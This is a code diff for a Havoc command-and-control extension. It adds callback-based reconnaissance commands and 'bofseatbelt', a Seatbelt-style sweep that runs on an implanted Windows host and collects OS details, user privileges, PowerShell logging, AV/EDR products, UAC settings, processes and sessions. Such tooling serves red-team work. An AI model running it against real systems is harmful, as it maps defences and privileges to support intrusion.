@@ -1,5 +1,7 @@
 from havoc import Demon, RegisterCommand, RegisterModule
+import json
 import re
+import os
 
 class SAPacker:
     def __init__(self):
@@ -77,6 +79,13 @@ def ipconfig( demonID, *param ):
 
     return TaskID
 
+def ipconfig_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/ipconfig.{demon.ProcessArch}.o", b'' )
+
+
 def listdns( demonID, *param ):
     TaskID : str    = None
     demon  : Demon  = None
@@ -143,6 +152,12 @@ def uptime( demonID, *param ):
 
     return TaskID
 
+def uptime_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/uptime.{demon.ProcessArch}.o", b'' )
+
 def whoami( demonID, *param ):
     TaskID : str    = None
     demon  : Demon  = None
@@ -154,6 +169,12 @@ def whoami( demonID, *param ):
 
     return TaskID
 
+def whoami_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/whoami.{demon.ProcessArch}.o", b'' )
+
 def windowlist( demonID, *param ):
     TaskID : str    = None
     demon  : Demon  = None
@@ -164,6 +185,12 @@ def windowlist( demonID, *param ):
     demon.InlineExecute( TaskID, "go", f"ObjectFiles/windowlist.{demon.ProcessArch}.o", b'', False )
 
     return TaskID
+
+def windowlist_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/windowlist.{demon.ProcessArch}.o", b'' )
 
 def reg_query_parse_params( demon, params ):
     packer = SAPacker()
@@ -359,7 +386,6 @@ def wmi_query_parse_params( demon, params ):
 def wmi_query( demonID, *params ):
     TaskID : str    = None
     demon  : Demon  = None
-    packer = SAPacker()
     demon  = Demon( demonID )
 
     packed_params = wmi_query_parse_params( demon, params )
@@ -371,6 +397,16 @@ def wmi_query( demonID, *params ):
     demon.InlineExecute( TaskID, "go", f"ObjectFiles/wmi_query.{demon.ProcessArch}.o", packed_params, False )
 
     return TaskID
+
+def wmi_query_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = wmi_query_parse_params( demon, params )
+    if packed_params is None:
+        return False
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/wmi_query.{demon.ProcessArch}.o", packed_params )
 
 def nslookup_parse_params( demon, params ):
     packer = SAPacker()
@@ -458,6 +494,22 @@ def env( demonID, *params ):
     demon.InlineExecute( TaskID, "go", f"ObjectFiles/env.{demon.ProcessArch}.o", b'', False )
 
     return TaskID
+
+def reg_query_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = reg_query_parse_params( demon, params )
+    if packed_params is None:
+        return False
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/reg_query.{demon.ProcessArch}.o", packed_params )
+
+def env_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/env.{demon.ProcessArch}.o", b'' )
 
 def get_password_policy_parse_params( demon, params ):
     packer = SAPacker()
@@ -876,7 +928,6 @@ def adcs_enum( demonID, *params ):
 def enumlocalsessions( demonID, *params ):
     TaskID : str    = None
     demon  : Demon  = None
-    packer = SAPacker()
     demon  = Demon( demonID )
 
     num_params = len(params)
@@ -890,6 +941,18 @@ def enumlocalsessions( demonID, *params ):
     demon.InlineExecute( TaskID, "go", f"ObjectFiles/enumlocalsessions.{demon.ProcessArch}.o", b'', False )
 
     return TaskID
+
+def enumlocalsessions_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+
+    if num_params > 0:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return False
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/enumlocalsessions.{demon.ProcessArch}.o", b'' )
 
 def enum_filter_driver_parse_params( demon, params ):
     packer = SAPacker()
@@ -1239,6 +1302,16 @@ def userenum( demonID, *params ):
 
     return TaskID
 
+def userenum_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = userenum_parse_parans( demon, params )
+    if packed_params is None:
+        return False
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/netuserenum.{demon.ProcessArch}.o", packed_params )
+
 def domainenum_parse_params( demon, params ):
     packer = SAPacker()
 
@@ -1424,8 +1497,6 @@ def quser_parse_params( demon, params ):
 
     packer.addstr(hostname)
 
-    demon.InlineExecute( TaskID, "go", f"ObjectFiles/quser.{demon.ProcessArch}.o", packer.getbuffer(), False )
-
     return packer.getbuffer()
 
 def quser( demonID, *params ):
@@ -1440,6 +1511,442 @@ def quser( demonID, *params ):
     TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to obtain the list RDP connections on {hostname}" )
 
     demon.InlineExecute( TaskID, "go", f"ObjectFiles/quser.{demon.ProcessArch}.o", packed_params, False )
+
+    return TaskID
+
+def bofdir_parse_params( demon, params ):
+    packer = SAPacker()
+
+    num_params = len(params)
+    targetdir  = '.\\'
+    subdirs    = 0
+
+    if num_params > 2:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return None
+
+    if num_params > 0:
+        targetdir = params[0]
+
+    if num_params == 2 and params[1] != '/s':
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid parameter: {params[1]}" )
+        return None
+
+    if num_params == 2 and params[1] == '/s':
+        subdirs = 1
+
+    packer.addWstr(targetdir)
+    packer.addshort(subdirs)
+
+    return packer.getbuffer()
+
+def bofdir( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = bofdir_parse_params( demon, params )
+    if packed_params is None:
+        return False
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to list a directory" )
+
+    demon.InlineExecute( TaskID, "go", f"ObjectFiles/dir.{demon.ProcessArch}.o", packed_params, False )
+
+    return TaskID
+
+def bofdir_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = bofdir_parse_params( demon, params )
+    if packed_params is None:
+        return False
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/dir.{demon.ProcessArch}.o", packed_params )
+
+def tasklist_parse_params( demon, params ):
+    packer = SAPacker()
+
+    num_params = len(params)
+    hostname   = ''
+
+    if num_params > 1:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return None
+
+    if num_params > 0:
+        hostname = params[0]
+
+    packer.addWstr(hostname)
+
+    return packer.getbuffer()
+
+def tasklist( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = tasklist_parse_params( demon, params )
+    if packed_params is None:
+        return False
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon list running processes" )
+
+    demon.InlineExecute( TaskID, "go", f"ObjectFiles/tasklist.{demon.ProcessArch}.o", packed_params, False )
+
+    return TaskID
+
+def tasklist_with_callback( demonID, callback, *params ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    packed_params = tasklist_parse_params( demon, params )
+    if packed_params is None:
+        return False
+
+    return demon.InlineExecuteGetOutput( callback, "go", f"ObjectFiles/tasklist.{demon.ProcessArch}.o", packed_params )
+
+def os_info(data):
+    info = {}
+    keys = ['ProductName',
+            'ReleaseId',
+            'CurrentMajorVersionNumber',
+            'CurrentVersion',
+            'CurrentBuildNumber']
+    for k in keys:
+        regex = re.compile(rf'{k}\s+REG_\w+\s+(.*)')
+        match = re.search(regex, data)
+        if match is not None:
+            info[k] = match.group(1)
+        else:
+            info[k] = '?'
+    match = re.search(r'PROCESSOR_ARCHITECTURE=(.*)', data)
+    if match is not None:
+        info['arch'] = match.group(1)
+    else:
+        info['arch'] = '?'
+    match = re.search(r'^\s+(.+)\nHostname:\s+\S+\nDNS', data, re.MULTILINE)
+    if match is not None:
+        info['ip'] = match.group(1)
+    else:
+        info['ip'] = '?'
+    match = re.search(r'DNS Server:\s+(.*)', data)
+    if match is not None:
+        info['DNS'] = match.group(1)
+    else:
+        info['DNS'] = '?'
+    match = re.search(r'DNS Server:\s+.*[\s\S]*?Domain\n(.*)', data)
+    if match is not None:
+        info['Domain'] = match.group(1)
+    else:
+        info['Domain'] = '?'
+    match = re.search(r'^AdminPasswordStatus, AutomaticManagedPagefile.*', data, re.MULTILINE)
+    if match is not None:
+        line = match.group(0)
+        subdata = data.split(line)[1].split('\n')[1]
+        subdata = subdata.split(', ')
+        if len(subdata) >= 30:
+            manufacturer = subdata[28]
+            model = subdata[29]
+            info['manufacturer'] = manufacturer
+            info['model'] = model
+        else:
+            info['manufacturer'] = '?'
+            info['model'] = '?'
+    else:
+        info['manufacturer'] = '?'
+        info['model'] = '?'
+    match = re.search(r'Uptime: (.*)', data)
+    if match is not None:
+        info['uptime'] = match.group(1)
+    else:
+        info['uptime'] = '?'
+    return info
+
+def user_info(data):
+    info = {}
+    match = re.search(r'UserName\s+SID\s*\n[=\s]+\n(.*?)\s*S-', data)
+    if match is not None:
+        info['username'] = match.group(1)
+    else:
+        info['username'] = '?'
+    match = re.search(r'Mandatory Label\\(\S+)', data)
+    if match is not None:
+        info['integrity'] = match.group(1)
+    else:
+        info['integrity'] = '?'
+    match = re.search(r'GROUP INFORMATION\s+Type\s+SID\s+Attributes', data)
+    if match is not None:
+        line = match.group(0)
+        subdata = data.split(line)[1].split('\n\n')[0]
+        subdata = '\n'.join(subdata.split('\n')[2:])
+        info['groups'] = re.findall(r'^(.+?)\s*(?:Well-known group|Group|Alias)', subdata, re.MULTILINE)
+        info['isLocalAdmin'] = 'S-1-5-32-544' in subdata
+    else:
+        info['groups'] = ['?']
+        info['isLocalAdmin'] = '?'
+    match = re.search(r'Privilege Name\s*Description\s*State.*', data)
+    if match is not None:
+        line = match.group(0)
+        subdata = data.split(line)[1].split('\n\n')[0]
+        subdata = '\n'.join(subdata.split('\n')[2:])
+        info['privs'] = re.findall(r'^(\S*?)\s+', subdata, re.MULTILINE)
+    else:
+        info['privs'] = ['?']
+    # info['isadmin'] = aggressor.isadmin()
+    info['isadmin'] = False
+    return info
+
+def ps_info(data):
+    info = {}
+    info['versions'] = re.findall(r'PowerShellVersion\s+REG_SZ\s+(.*)', data)
+    info['CLRs'] = []
+    clrs = ['v1.0.3705', 'v1.1.4322', 'v2.0.50727', 'v3.0', 'v3.5', 'v4.0.30319']
+    for clr in clrs:
+        match = re.search(rf'^Contents of .*Framework\\{re.escape(clr)}\\System\.dll:', data, re.MULTILINE)
+        if match is not None:
+            info['CLRs'].append(clr)
+    # TODO: test these regexes in a Windows machine with logging enabled
+    match = re.search(r'EnableTranscripting\s+\w+\s+(\d+)', data)
+    if match is not None:
+        info['EnableTranscripting'] = int(match.group(1)) == 1
+    else:
+        info['EnableTranscripting'] = False
+    match = re.search(r'EnableInvocationHeader\s+\w+\s+(\d+)', data)
+    if match is not None:
+        info['EnableInvocationHeader'] = int(match.group(1)) == 1
+    else:
+        info['EnableInvocationHeader'] = False
+    match = re.search(r'EnableModuleLogging\s+\w+\s+(\d+)', data)
+    if match is not None:
+        info['EnableModuleLogging'] = int(match.group(1)) == 1
+    else:
+        info['EnableModuleLogging'] = False
+    match = re.search(r'EnableScriptBlockLogging\s+\w+\s+(\d+)', data)
+    if match is not None:
+        info['EnableScriptBlockLogging'] = int(match.group(1)) == 1
+    else:
+        info['EnableScriptBlockLogging'] = False
+    match = re.search(r'EnableScriptBlockInvocationLogging\s+\w+\s+(\d+)', data)
+    if match is not None:
+        info['EnableScriptBlockInvocationLogging'] = int(match.group(1)) == 1
+    else:
+        info['EnableScriptBlockInvocationLogging'] = False
+    return info
+
+def dotnet_info(data):
+    info = {}
+    match = re.search(r'Contents of C:\\Windows\\Microsoft\.Net\\Framework\\([\s\S]*?)Total File Size', data)
+    if match is None:
+        return info
+    dirs = match.group(1)
+    info['CLR'] = {}
+    info['CLR']['versions'] = re.findall(r'<dir> (v.*)', dirs)
+    info['.NET'] = {}
+    info['.NET']['versions'] = re.findall(r'\s+Version\s+REG_SZ\s+(.*)', data)
+    return info
+
+def avedr_info(data):
+    info = {}
+    data = data.split('displayName, instanceGuid')
+    if len(data) != 2:
+        return info
+    data = data[1]
+    data = data.split('\n\n')
+    if len(data) < 2:
+        return info
+    data = data[0]
+    info['AVs'] = re.findall(r'^([^,]+), .+?, .+?, ([^,]+), ', data, re.MULTILINE)
+    return info
+
+def processes_info(data):
+    info = {}
+    # all processes
+    match = re.search(r'Name\s+ProcessId\s+ParentProcessId\s+SessionId\s+CommandLine', data)
+    if match is None:
+        return info
+    data = data.split(match.group(0))[1]
+    info['names'] = re.findall(r'^(\w+\.exe)\s+\d+\s+\d+', data, re.MULTILINE)
+    proctypes = ['browser', 'interesting', 'defensive']
+    for proctype in proctypes:
+        info[proctype] = {}
+        with open(os.path.join(os.path.dirname(os.path.realpath('__file__')), 'client/Modules/SituationalAwareness/', f'{proctype}.json')) as f:
+            j = json.load(f)
+        for type_example in j:
+            for proc in info['names']:
+                if type_example == proc[:-4]:
+                    info[proctype][proc] = j[type_example]
+    return info
+
+def uac_info(data):
+    info = {}
+    match = re.search(r'ConsentPromptBehaviorAdmin\s+REG_DWORD\s+(\d+)', data)
+    if match is not None:
+        info['ConsentPromptBehaviorAdmin'] = int(match.group(1))
+    else:
+        info['ConsentPromptBehaviorAdmin'] = ''
+    match = re.search(r'EnableLUA\s+REG_DWORD\s+(\d+)', data)
+    if match is not None:
+        info['EnableLUA'] = int(match.group(1)) == 1
+    else:
+        info['EnableLUA'] = False
+    match = re.search(r'LocalAccountTokenFilterPolicy\s+REG_DWORD\s+(\d+)', data)
+    if match is not None:
+        info['LocalAccountTokenFilterPolicy'] = int(match.group(1)) == 1
+    else:
+        info['LocalAccountTokenFilterPolicy'] = False
+    match = re.search(r'FilterAdministratorToken\s+REG_DWORD\s+(\d+)', data)
+    if match is not None:
+        info['FilterAdministratorToken'] = int(match.group(1)) == 1
+    else:
+        info['FilterAdministratorToken'] = False
+    return info
+
+def local_users_info(data):
+    info = {}
+    info['local_users'] = re.findall(rf'^-- (.*)$', data, re.MULTILINE)
+    return info
+
+def local_sessions_info(data):
+    info = {}
+    info['local_sessions'] = re.findall(r'^  - \[\d\] (.*?)$', data, re.MULTILINE)
+    return info
+
+def open_windows_info(data):
+    info = {}
+    # the windowlist command should be ran last
+    match = re.search(r'Total of \d+ entries enumerated([\S\s]*)$', data)
+    if match is not None:
+        data = match.group(1)
+        info['open_windows'] = re.findall(r'^(.+)$', data, re.MULTILINE)
+    else:
+        info['open_windows'] = []
+    return info
+
+def bofseatbelt_report( demonID ):
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    with open('/tmp/bofseatbelt.txt', 'r') as f:
+        data = f.read()
+
+    report = {}
+    report['os'] = os_info(data)
+    report['user'] = user_info(data)
+    report['ps'] = ps_info(data)
+    report['dotnet'] = dotnet_info(data)
+    report['avedr'] = avedr_info(data)
+    report['processes'] = processes_info(data)
+    report['uac'] = uac_info(data)
+    report['local_users'] = local_users_info(data)
+    report['local_sessions'] = local_sessions_info(data)
+    report['open_windows'] = open_windows_info(data)
+    #print(json.dumps(report, indent=2))
+
+    #demon.ConsoleWrite( demon.CONSOLE_INFO, 'OS Information' )
+
+def bofseatbelt_callback( demonID, worked, output ):
+    # check how many times we got a callback
+    try:
+        with open('/tmp/bofseatbelt_num.txt', 'r') as f:
+            bofs_ran = int(f.read())
+    except:
+        bofs_ran = 0
+
+    # if this is the first time, remove the bofseatbelt file
+    if bofs_ran == 35:
+        bofs_ran = 0
+        os.remove('/tmp/bofseatbelt_num.txt')
+
+    # add the output of this callback to the bofseatbelt file
+    with open('/tmp/bofseatbelt.txt', 'a') as f:
+        if worked:
+            f.write(f'BOF worked: {output}')
+        else:
+            f.write(f'BOF failed')
+        f.write('\n---------------------\n')
+
+    # store that we got a new callback
+    bofs_ran += 1
+    with open('/tmp/bofseatbelt_num.txt', 'w') as f:
+        f.write(f'{bofs_ran}')
+
+    # are we done?
+    if bofs_ran == 35:
+        os.remove('/tmp/bofseatbelt_num.txt')
+        bofseatbelt_report( demonID )
+
+def bofseatbelt( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    demon  = Demon( demonID )
+
+    # Getting basic OS information
+
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentMajorVersionNumber" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentVersion" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuildNumber" )
+    env_with_callback( demonID, bofseatbelt_callback )
+    ipconfig_with_callback( demonID, bofseatbelt_callback )
+    wmi_query_with_callback( demonID, bofseatbelt_callback, "Select Domain from Win32_ComputerSystem" )
+    wmi_query_with_callback( demonID, bofseatbelt_callback, "Select * from Win32_ComputerSystem" )
+    uptime_with_callback( demonID, bofseatbelt_callback )
+
+    # Getting User information
+
+    whoami_with_callback( demonID, bofseatbelt_callback )
+
+    # Getting PowerShell information
+
+    bofdir_with_callback( demonID, bofseatbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v1.0.3705\\System.dll' )
+    bofdir_with_callback( demonID, bofseatbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v1.1.4322\\System.dll' )
+    bofdir_with_callback( demonID, bofseatbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll' )
+    bofdir_with_callback( demonID, bofseatbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v3.0\\System.dll' )
+    bofdir_with_callback( demonID, bofseatbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v3.5\\System.dll' )
+    bofdir_with_callback( demonID, bofseatbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\System.dll' )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine", "PowerShellVersion" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine", "PowerShellVersion" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", "EnableTranscripting" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", "EnableInvocationHeader" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging", "EnableModuleLogging" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", "EnableScriptBlockLogging" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", "EnableScriptBlockInvocationLogging" )
+
+    # Getting .NET information
+
+    bofdir_with_callback( demonID, bofseatbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\' )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5", "Version" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full", "Version" )
+
+    # Getting AVs/EDRs information
+
+    wmi_query_with_callback( demonID, bofseatbelt_callback, "SELECT * FROM AntiVirusProduct", ".", "root\\SecurityCenter2" )
+
+    # Getting information about the running processes
+
+    tasklist_with_callback( demonID, bofseatbelt_callback )
+
+    # Getting UAC information
+
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "LocalAccountTokenFilterPolicy" )
+    reg_query_with_callback( demonID, bofseatbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "FilterAdministratorToken" )
+
+    # Getting Local Users information
+    userenum_with_callback( demonID, bofseatbelt_callback )
+
+    # Getting Local Sessions information
+
+    enumlocalsessions_with_callback( demonID, bofseatbelt_callback )
+
+    # Getting Open windows information
+
+    windowlist_with_callback( demonID, bofseatbelt_callback )
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run BofSeatbelt" )
 
     return TaskID
 
@@ -1488,3 +1995,6 @@ RegisterCommand( netsharesAdmin, "", "netsharesAdmin", "List shares on local or 
 RegisterCommand( netuptime, "", "netuptime", "Returns information about the boot time on the local (or a remote) machine", 0, "[opt: hostname]", "" )
 RegisterCommand( netview, "", "netview", "lists local workstations and servers", 0, "[opt: netbios_domain_name]", "" )
 RegisterCommand( quser, "", "quser", "Simple implementation of quser.exe usingt the Windows API", 0, "<OPT:TARGET>", "10.10.10.10" )
+RegisterCommand( bofdir, "", "bofdir", "Lists a target directory using BOF.", 0, "[directory] [/s]", "C:\\Windows\\Temp" )
+RegisterCommand( tasklist, "", "tasklist", "This command displays a list of currently running processes on either a local or remote machine.\nUsage:   tasklist [hostname]\n         hostname    - Optional. Specifies the remote system to connect to. Do\n                        not include or use '.' to indicate the command should\n                        be run on the local system.\nNote:   You must have a valid login token for the system specified if not\n         local. This token can be obtained using make_token.", 0, "[hostname]", "" )
+RegisterCommand( bofseatbelt, "", "bofseatbelt", "A Seatbelt port using BOFs", 0, "", "" )
